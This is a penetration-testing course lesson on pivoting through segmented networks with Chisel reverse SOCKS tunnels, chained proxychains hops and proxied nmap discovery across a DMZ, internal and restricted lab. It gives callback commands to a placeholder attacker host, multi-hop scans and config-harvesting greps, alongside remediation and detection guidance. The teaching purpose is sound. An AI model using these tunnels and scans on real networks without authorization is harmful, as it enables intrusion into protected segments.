# 12.2 — Pivoting through segmented networks: reverse tunnels (Chisel), discovery through a pivot &amp; the DMZ→internal→restricted model

<div class="prereq">

**Prerequisites:** [00.1](../module-00/lesson-01.md) (authorization &amp; scope),
[01.3](../module-01/lesson-03.md) (routing, NAT, stateful firewalls — the *direction* that matters
here), [04.x](../module-04/lesson-01.md) (Linux footholds), [M11](../module-11/lesson-01.md)
(lateral movement to get each foothold), and [12.1](lesson-01.md) — you must already be fluent in
local/remote/dynamic forwarding, SOCKS, and proxychains. This lesson is what you do when **SSH isn't
available** and when there is **more than one boundary** to cross.

**Module:** M12 Pivoting &amp; complex networks. **Difficulty:** 🔴 advanced.
**You will produce:** a reverse SOCKS tunnel through an inbound-blocked firewall using Chisel, a
mapped multi-segment topology discovered *through* the pivot, and a report-ready analysis of the
segmentation failure that made it possible.

</div>

## Why this matters

[12.1](lesson-01.md) assumed you could SSH *to* the pivot and initiate connections into its network.
Real segmented networks are rarely that kind. The whole point of a DMZ is that it should **not** be
able to reach back to the Internet, and a hardened internal firewall drops inbound connections from
the DMZ. When the direction you need is blocked, or the pivot has no SSH server (a stripped web
appliance, a Windows box, a container), the SSH-forwarding toolkit stalls — and this is exactly the
situation most engagements reach.

This lesson teaches the two skills that carry you the rest of the way: **reverse tunnels** that
defeat inbound-blocked firewalls by making the foothold connect *out* to you (with Chisel, the
standard cross-platform tool when SSH is unavailable), and **multi-hop pivoting** to cross more than
one boundary — the realistic **DMZ → internal → restricted** model. Getting through segmentation,
and then *documenting how the segmentation failed*, is the core deliverable of a pivoting
engagement and of assessment **A6**.

## Learning objectives

- Explain *why a reverse tunnel beats an inbound-blocked firewall* from the stateful-firewall
  direction rule, and when you need one instead of an SSH forward.
- Stand up a **Chisel reverse SOCKS tunnel** (server on your attack box, client on the pivot) and
  route tools through it with proxychains.
- **Discover and map** a network segment you can only reach through a pivot — hosts, services, and
  the next boundary — under the constraints proxied scanning imposes.
- Chain pivots to cross **multiple** boundaries (DMZ → internal → restricted) and reason about the
  performance and reliability cost of each hop.
- Analyse a segmentation architecture, demonstrate its failure with evidence, and write the
  remediation the way a client can act on it.

## Intuition

Two ideas. First, **a firewall that blocks inbound connections still allows the replies to
connections that started on its trusted side** — the stateful rule from [01.3](../module-01/lesson-03.md).
So if you cannot get *in*, you make the foothold reach *out* to you, and then run your tunnel
*backwards* down the connection it opened. The firewall sees an outbound connection it permits and a
stream of replies to it; it never sees you knock.

Second, **each boundary you cross is just another instance of the 12.1 problem**, solved from a new
vantage point. Once you can reach the internal segment through the DMZ, an internal host becomes
your *next* pivot into the restricted segment. Pivoting composes: the DMS→internal→restricted model
is not a new technique, it is the same reachability move applied twice, and the discipline is
keeping track of which vantage point you are speaking from.

## The underlying technology

### Reverse tunnels — turning the connection direction around

A stateful firewall in front of the internal (or restricted) segment typically enforces: *DMZ hosts
may not open connections inward, and may not open connections out to the Internet.* An `ssh -L` from
your box fails (you can't reach in); even `ssh -R` needs *you* to SSH to the pivot first (you can't).
The move that survives is: get the **pivot to connect out to you** on a port egress *does* allow
(often 80/443), then push a proxy back down that connection.

```text
        outbound (allowed)              tunnel runs backwards
[pivot] ─────────────────────▶ [YOU:8000]   ◀═══ SOCKS proxy served here
  │  "client, connect to attacker"           you point proxychains at it
  └─ can reach internal segment; you now reach it too, via the pivot
```

The firewall permits the pivot's outbound connection; the reverse SOCKS proxy then lets *you* drive
connections *through* the pivot into its networks — the direction that was blocked — because those
connections ride inside the session the pivot itself initiated. This is why **T1090.002 (external
proxy)** and **T1571/T1572 (non-standard port / protocol tunnelling)** describe callbacks on 443:
the tunnel wears the clothes of ordinary allowed egress.

### Chisel — reverse SOCKS when there is no SSH

**Chisel** is a single Go binary that tunnels TCP (and UDP) over HTTP, optionally secured, and is the
standard choice when the pivot has no SSH server or you need it to work identically on Linux and
Windows. Its `--reverse` mode is built precisely for the direction problem:

```bash
# LAB ONLY.
# 1) On YOUR attack box (reachable by the pivot's egress): run the server, allow reverse tunnels.
chisel server -p 8000 --reverse
#   listens on 8000; --reverse lets clients request listeners/proxies that point back to them

# 2) On the PIVOT (only needs outbound to you): connect back and ask for a reverse SOCKS proxy.
chisel client YOUR_ATTACKER_IP:8000 R:socks
#   R:socks  = "open a SOCKS5 proxy on the SERVER (my attack box) that egresses through ME (the pivot)"
```

That `R:socks` opens a SOCKS5 listener **on your attack box** (default `127.0.0.1:1080`) whose
traffic exits from the pivot into the pivot's networks — a reverse dynamic forward, exactly like
`ssh -D` but with the connection having been initiated by the pivot. You then use it identically:

```ini
# proxychains.conf
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080     # Chisel's reverse SOCKS proxy on your attack box
```

```bash
proxychains nmap -sT -Pn -n -p 22,80,443,445,3389 172.16.20.0/24
```

Chisel can also do a single **reverse port forward** (`R:3306:172.16.20.40:3306`) — the analogue of
`ssh -R`/`-L` for one service — when you want one pinned port rather than a whole SOCKS route.

<div class="callout key">

**Choosing the tunnel.** If you can SSH *to* the pivot and initiate inward → use **`ssh -D`/`-L`**
(12.1). If you *cannot* reach the pivot but it can reach *you* → you need a **reverse tunnel**;
use **Chisel `--reverse` + `R:socks`** (or `ssh -R` if an SSH server and a way to launch it exist).
The deciding question is unchanged from 12.1 — *which side can initiate?* — you have simply hit the
case where the answer is "only the pivot."

</div>

### Multi-hop pivoting — one boundary at a time

To reach the restricted segment behind a second firewall (only the internal segment can talk to it),
you pivot *again* from a foothold on the internal segment. Two common shapes:

- **Chained SOCKS.** Compromise an internal host through your first proxy, run a second tunnel from
  *it*, and add that proxy to `proxychains.conf`. With `strict_chain`, proxychains routes through
  both in order — your traffic goes attack-box → DMZ pivot → internal pivot → restricted host.

```ini
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080     # hop 1: reverse proxy egressing from the DMZ pivot
socks5 127.0.0.1 1081     # hop 2: reverse proxy egressing from the internal pivot
```

- **Nested reverse tunnels.** The internal pivot's Chisel client connects back through the *first*
  tunnel to your server, giving you a second reverse SOCKS whose egress is the internal host.

Each hop adds latency and a failure point, so multi-hop scanning is slow and must be *narrow* — scan
a handful of ports on likely hosts, not a full range across two proxies. This is where methodology
beats brute force: use discovery on the near segment to pick precise targets on the far one.

### Discovery through a pivot

Enumerating a segment you can only see through SOCKS inherits every 12.1 limit — **TCP-connect only,
no ICMP, no raw SYN, `-sT -Pn -n` mandatory** — plus new ones from distance:

```bash
# LAB ONLY. Through the (reverse) SOCKS proxy:
proxychains -q nmap -sT -Pn -n -T3 --top-ports 20 172.16.20.0/24   # sweep: what's alive?
proxychains -q nmap -sT -Pn -n -p 8080 -sV 172.16.20.30            # focus: version the finds
```

Because ping doesn't traverse SOCKS, "host discovery" becomes "did a TCP connect to a common port
succeed?" — so you infer live hosts from open ports, and a silent host may simply have no open
common port rather than being down. Read the far segment's own artifacts to fill the gaps: a
compromised internal host's `arp -a`, routing table, `/etc/hosts`, and config files name the
restricted-segment hosts far more reliably than a blind proxied sweep.

## Why the weakness exists

The architecture is *meant* to stop exactly this: DMZ isolated from internal, internal isolated from
restricted, no egress from the DMZ. Pivoting succeeds when a rule is **too broad** — the DMZ host is
allowed to reach the whole internal range instead of one endpoint, or egress filtering permits
outbound 443 that a reverse tunnel rides, or the internal firewall trusts *any* internal source to
reach the restricted segment. This is **CWE-923** (improper restriction of communication channels)
and the failure of defence-in-depth segmentation that **NIST SP 800-125B** and the zero-trust model
(**NIST SP 800-207**) exist to prevent. You are not defeating a cryptographic control; you are
demonstrating that a *network trust assumption* was wrong.

## How a tester recognises the situation

<div class="callout method">

- **12.1's forwards fail on direction.** You can't SSH to the pivot, or the pivot can't accept your
  inbound connection, but the foothold *can* reach out (test with an allowed-egress callback) → you
  need a reverse tunnel.
- **A second, further RFC 1918 range** appears only in a *compromised internal host's* routes/ARP/
  configs — a segment behind another boundary you must hop to reach.
- **Tiered naming and addressing** — `dmz-*`, `app-*`/`10.x`, `db-*`/`restricted`/`172.16.x` — signals
  a deliberate DMZ→internal→restricted design whose boundaries you should map and test, not blunder
  across.

</div>

## Manual investigation

From each foothold, before tunnelling onward, harvest what points at the *next* segment:

```bash
ip route; arp -a                 # directly-attached ranges and live neighbours
cat /etc/hosts /etc/resolv.conf  # named internal/restricted hosts and the resolver to use
ss -tnp                          # established connections reveal who this host talks to
grep -rEi 'host|server|10\.|172\.|db|internal' /var/www /opt /home 2>/dev/null  # config leads
```

Established connections and config strings are gold: a DMZ web app already connected to
`db.restricted.lab` tells you the restricted host, its port, and that the path is allowed — often
before any scan.

## Tooling — what it does, key options, limits, verify

- **Chisel** (`chisel server -p 8000 --reverse`; `chisel client ATTACKER:8000 R:socks` or
  `R:LPORT:HOST:PORT`). *What:* TCP/UDP over HTTP tunnels, reverse mode for inbound-blocked pivots,
  one static binary per OS. Options: `--auth user:pass` (authenticate the tunnel), `--tls-*`/`https`
  (wrap in TLS), `--keepalive`, `--fingerprint`. *Limits:* you must land the binary on the pivot
  (RoE-dependent); it is a well-known tool that EDR flags — this is a *lab* technique for
  understanding the mechanism, not an evasion recipe. *Verify:* the server logs the session; a
  proxied request returns far-side content.
- **proxychains-ng** — as in 12.1; here it chains **multiple** SOCKS hops with `strict_chain`.
  *Limit:* every hop compounds latency and TCP-only restrictions; keep proxied scans narrow.
- **sshuttle** — if SSH *to* an internal pivot is available after the first hop, a transparent
  subnet route is faster than chained SOCKS for that leg. *Limit:* needs SSH + Python on that pivot.
- **ligolo-ng** — a modern alternative that presents the remote network as a local `tun` interface,
  side-stepping proxychains' TCP-only constraint. *Named for awareness*; the SOCKS/Chisel model here
  teaches the underlying mechanism you must understand first.

## Demonstration (LAB ONLY)

<div class="callout attack">

**Technique — reverse SOCKS through an inbound-blocked DMZ, then a second hop to the restricted
segment.**

```bash
# --- Hop 1: DMZ pivot cannot accept inbound; it CAN reach your attack box on 8000 (allowed egress) ---
# On attack box:
chisel server -p 8000 --reverse --auth lab:Lab-Passw0rd!
# On the DMZ foothold (from M11), landed via your existing shell:
./chisel client --auth lab:Lab-Passw0rd! ATTACKER_IP:8000 R:socks   # reverse SOCKS on attacker:1080

# Discover the internal segment through hop 1 (TCP-connect, no ping — see 12.1):
proxychains -q nmap -sT -Pn -n --top-ports 20 172.16.20.0/24
proxychains -q curl -s http://172.16.20.30:8080/         # internal admin panel → LAB-FLAG-{uuid}

# --- Hop 2: from a compromised internal host, reach the restricted segment (behind a 2nd firewall) ---
# The internal host (172.16.20.30) can reach 192.168.50.0/24; your box and the DMZ cannot.
# Land Chisel on it (through hop 1) and open a SECOND reverse SOCKS egressing from it:
proxychains ./push-chisel-to 172.16.20.30       # (your delivery method; lab provides one)
# On 172.16.20.30:
./chisel client --auth lab:Lab-Passw0rd! ATTACKER_IP:8000 R:1081:socks   # second SOCKS on attacker:1081

# Add hop 2 to proxychains.conf (socks5 127.0.0.1 1081) — strict_chain routes through both — then:
proxychains -q nmap -sT -Pn -n -p 1433,3306,445 192.168.50.0/24
proxychains -q curl -s http://192.168.50.10/           # restricted target → LAB-FLAG-{uuid}
```

The restricted host was never reachable from your box or the DMZ — only from the internal segment.
By chaining a reverse tunnel per boundary you reached it *through* the intended-to-be-isolated tiers,
and the `LAB-FLAG-{uuid}` on `192.168.50.10` is your evidence that the segmentation was traversable.

</div>

<div class="callout warn">

Chisel and ligolo-ng are widely-signatured tools. This course drops them on **lab** hosts to teach
the *mechanism* of reverse tunnelling; it does not teach tuning them to evade real EDR. On a real
engagement, tool choice, delivery, and detectability are RoE and OPSEC decisions ([M15](../module-15/lesson-01.md)),
and dropping a binary may itself need client sign-off.

</div>

<div class="callout legal">

**LAB TARGET vs REAL SYSTEM.** All addresses (`10.10.0.x`, `172.16.20.x`, `192.168.50.x`) and the
`lab:Lab-Passw0rd!` credentials belong to `labs/lab-12-pivot` on the isolated network. Pivoting is a
legitimate way to reach **in-scope** internal targets — and multi-hop tunnels make it dangerously
easy to wander into a segment or host the engagement never authorised. Before crossing *each*
boundary, re-check that the next segment is in scope; a tunnel is capability, not authorization
([00.1](../module-00/lesson-01.md)). Reaching a restricted segment you were not scoped for is a scope
violation even if the tunnel made it trivial.

</div>

## Verification

Prove each hop independently. Hop 1: the Chisel server logs the session open; a proxied request
returns the *internal* host's `LAB-FLAG-{uuid}`. Hop 2: the second SOCKS listener exists
(`ss -tnlp` on your box shows `1081`); a request through the *chained* proxies returns the
*restricted* host's flag, which is unreachable through hop 1 alone (test that — it should fail
without hop 2, proving the second boundary is real). Record the topology you proved: for each
segment, which vantage point reached it and which could not.

## Impact

A working multi-hop pivot means the client's tiered defence — the reason a database sits in a
"restricted" segment behind two firewalls — did not stop an attacker who started in the DMZ. The
business impact is the crown-jewel data or system in the innermost tier, reached from the least
trusted one. Just as important for the report: you have empirically mapped *which* boundary rules
were too permissive (DMZ→internal, internal→restricted, or DMZ egress), so the finding is not "we got
in" but "these specific segmentation controls are ineffective, here is the path, here is the fix."

## Remediation — segmentation done right

<div class="callout defend">

- **Deny-by-default egress, especially from the DMZ.** A DMZ host that cannot open outbound
  connections to arbitrary destinations (including your attack box on 443) cannot host a reverse
  tunnel. Allow only the specific outbound endpoints the service needs.
- **Endpoint-scoped inter-tier rules.** DMZ→internal should permit *one app to one DB port on one
  host*, not the tier. Internal→restricted likewise. Broad "any internal source" rules are what
  multi-hop pivots exploit.
- **Micro-segmentation / zero trust (NIST SP 800-207).** Authenticate and authorise every flow, not
  just those crossing the perimeter, so a compromised host cannot freely reach its neighbours.
- **Application-layer proxies, not flat routing, between tiers**, so a raw TCP tunnel has nothing to
  ride. Combined with strong host auth and monitored jump hosts for legitimate admin access.

The tester's job here is to demonstrate the *failure* concretely (the mapped path and captured
flags) so these controls get funded — segmentation is invisible until someone shows it leaking.

</div>

## Detection / blue-team view

<div class="callout defend">

- **DMZ hosts initiating outbound connections**, particularly long-lived ones to external IPs on
  443/80 — the reverse-tunnel signature. This is **T1090.002 (external proxy)** and **T1572
  (protocol tunnelling)**, often on **T1571 (non-standard port)** traffic patterns that don't match
  the protocol claimed.
- **East-west anomalies** — an internal host suddenly scanning or connecting across the restricted
  segment (**T1046 network service discovery** and **T1090.001 internal proxy**). Flow telemetry
  between tiers, not just at the edge, is what surfaces this; a segmented network should have very
  predictable inter-tier flows, so a pivot stands out.
- **Known-tool signatures and dropped binaries** — Chisel/ligolo-ng binaries, their HTTP handshake
  patterns, and unexpected executables on a DMZ host (FIM). Process telemetry showing a web-server
  account spawning a network client is a strong lead.
- **The composite tell:** a host that both received a foothold *and* began relaying connections to a
  segment it never previously touched. Correlating the two is the detection a mature SOC builds.

</div>

## Practical lab

<div class="lab">

**Environment:** `labs/lab-12-pivot` (built separately) — attack box → **DMZ** (`10.10.0.0/24`,
partly reachable) → **internal** (`172.16.20.0/24`) → **restricted** (`192.168.50.0/24`), each
boundary enforced by a stateful firewall; the DMZ pivot has **no inbound path** for you but egress to
your box, so a reverse tunnel is required. **Access:** a `lab` foothold on the DMZ host (from M11).
**Targets:** lab hosts only; a `LAB-FLAG-{uuid}` on an internal service and another on a restricted
service prove each hop. **Time:** ~120 min. **Isolation:** private Docker networks, no Internet route;
reset per the lab README. Chisel binaries for each OS are provided in the lab.

</div>

1. Confirm you cannot SSH-forward inward and that the pivot *can* reach your box; stand up a Chisel
   reverse SOCKS tunnel and prove it with a proxied request to an internal host's flag.
2. Discover and map `172.16.20.0/24` through the tunnel (`-sT -Pn -n`), then read a compromised
   internal host's ARP/routes/configs to find the restricted segment.
3. Chain a second reverse tunnel from the internal host and reach a `192.168.50.x` restricted target;
   capture its flag and prove it is *unreachable* through hop 1 alone.
4. Draw the topology you empirically verified and note, per boundary, which rule was too permissive.

## Exercise

<div class="callout method">

**Situation.** Authorised internal engagement, scope includes `10.10.0.0/24`, `172.16.20.0/24`, and
`192.168.50.0/24`. You hold a `lab` foothold on a DMZ host (`10.10.0.5`). A stateful firewall blocks
*all* inbound connections to the DMZ (you cannot SSH to it or connect to any listener you start on
it), but the DMZ host can reach your attack box on 443. Somewhere on the internal segment is a host
that can reach a **restricted** segment your DMZ foothold cannot. A `LAB-FLAG-{uuid}` sits on a
service in the restricted segment. **The intended route is not given to you.**

**Objective.** From the DMZ foothold, discover the internal network, pivot onto it, discover and
reach the restricted-segment target, and capture its flag — then produce an evidence-backed,
report-ready account of the path and the segmentation failure that permitted it.

**Starting information.** The foothold, its shell, your attack box with Chisel and proxychains, and
the three in-scope ranges. No pre-drawn topology, no host list.

**Constraints.** Lab target only; stay within the three in-scope ranges — re-verify scope before
crossing *each* boundary even though the tunnel would let you go further. TCP-connect scanning only
through the proxies; keep multi-hop scans narrow and justify your target selection. Explain the
mechanism of every tunnel; capture verification evidence for each hop.

**Expected deliverables.**
1. A **topology diagram** you verified empirically: the three segments, which vantage point reached
   each, and the two boundaries, with evidence (proxied scan output + captured flags per hop).
2. The **tunnel design** — why a reverse tunnel was required at the DMZ (the direction argument),
   the Chisel commands used, and how you chained the second hop, with the *which-side-initiates*
   reasoning for each.
3. How you **discovered the restricted segment** without being told the route (which artifacts on the
   internal foothold revealed it), and why blind proxied scanning alone was insufficient.
4. A **segmentation analysis**: which specific rule at each boundary was too permissive, the concrete
   remediation, and the detection signature (mapped to ATT&CK) a defender should deploy.

</div>

<details><summary>Hint 1 — conceptual direction</summary>
Start with 12.1's selection question. You cannot initiate toward the DMZ pivot at all — so which
side must initiate, and which tunnel family is that? Everything after hop 1 is the same question,
asked again from the internal foothold.
</details>

<details><summary>Hint 2 — technique family</summary>
Inbound blocked but egress allowed → reverse tunnel. No SSH server to rely on → Chisel
<code>--reverse</code> + <code>R:socks</code>. The restricted segment is behind a second boundary
only the internal segment crosses → you must pivot <em>again</em> from an internal host, chaining a
second SOCKS hop in proxychains.
</details>

<details><summary>Hint 3 — where to look</summary>
Don't blind-scan two proxies deep. On the internal foothold, read <code>arp -a</code>,
<code>ip route</code>, <code>/etc/hosts</code>, established connections (<code>ss -tnp</code>), and
app configs — they name the restricted host and prove the path is allowed, so your narrow proxied
scan knows exactly where to look.
</details>

<details><summary>Hint 4 — specific direction</summary>
Hop 1: <code>chisel server -p 8000 --reverse</code> on your box, <code>chisel client ATTACKER:8000
R:socks</code> on the DMZ host; discover <code>172.16.20.0/24</code> with <code>proxychains nmap -sT
-Pn -n</code>. Hop 2: land Chisel on the internal host, <code>R:1081:socks</code>, add
<code>socks5 127.0.0.1 1081</code> under <code>strict_chain</code>, then reach
<code>192.168.50.x</code>. Verify hop 2's target fails through hop 1 alone.
</details>

## Check yourself

<div class="callout key">

1. A DMZ firewall drops *all* inbound connections but allows the DMZ host to reach the Internet on
   443. Explain, from the stateful-firewall direction rule, why a Chisel reverse tunnel works when
   both `ssh -L` and `ssh -R` fail here.
2. You have a reverse SOCKS proxy through the DMZ pivot and can reach the internal segment, but a
   restricted host at `192.168.50.10` is unreachable through it. What does that tell you about the
   topology, and what must you do next?
3. Through two chained SOCKS proxies, a full `nmap -sT -Pn` of a `/24` is painfully slow and
   unreliable. Why, mechanically — and what methodology reduces the number of blind probes you need?
4. Why can't you use ICMP ping or a raw SYN scan to find live hosts through either an `ssh -D` or a
   Chisel reverse SOCKS proxy? What do you use instead to infer which hosts are up?
5. Frame the finding for the client: you reached a restricted-segment database from a DMZ foothold
   via one internal hop. In one or two sentences, state *which* segmentation controls failed and the
   single most impactful remediation — not "we got a shell."

</div>

Model answers are in `solutions/module-12.md` (instructor material — try them first).

## References

- **Chisel** — github.com/jpillora/chisel (README: `server --reverse`, `client R:socks` /
  `R:host:port` remotes, `--auth`, TLS options, and the HTTP-tunnel design).
- **OpenSSH** — `ssh(1)` `-R`/`-D` (the SSH reverse/dynamic analogues from 12.1); **RFC 4254** §7.
- **RFC 1928** — SOCKS5 (what proxychains and Chisel's `socks` remote speak).
- **proxychains-ng** — github.com/rofl0r/proxychains-ng (`strict_chain` for multi-hop; TCP-only
  limit). **ligolo-ng** — github.com/nicocha30/ligolo-ng (tun-interface alternative — awareness).
- **NIST SP 800-125B** — Secure Virtual Network Configuration (segmentation); **NIST SP 800-207** —
  Zero Trust Architecture; **NIST SP 800-115** — technical testing methodology.
- **MITRE ATT&CK** — **T1090** Proxy (.001 Internal, .002 External), **T1572** Protocol Tunneling,
  **T1571** Non-Standard Port, **T1046** Network Service Discovery.
- **CWE-923** — Improper Restriction of Communication Channel to Intended Endpoints; **CWE-1327** —
  Binding to an Unrestricted IP Address (over-broad exposure that inter-tier pivots exploit).

## What you should now be able to do

- Explain why a reverse tunnel defeats an inbound-blocked firewall, and recognise when 12.1's
  forwards can't be used.
- Stand up a Chisel reverse SOCKS tunnel and drive proxychains through it, respecting proxied-scan
  limits.
- Discover and map a segment reachable only through a pivot, using both narrow proxied scans and the
  far foothold's own artifacts.
- Chain pivots across multiple boundaries (DMZ→internal→restricted) and reason about the cost of each
  hop.
- Analyse a segmentation architecture, demonstrate its failure with per-hop evidence, and write the
  remediation and T1090/T1572 detection a client can act on.

## Progress checkpoint

```bash
py course.py complete 12.2
```
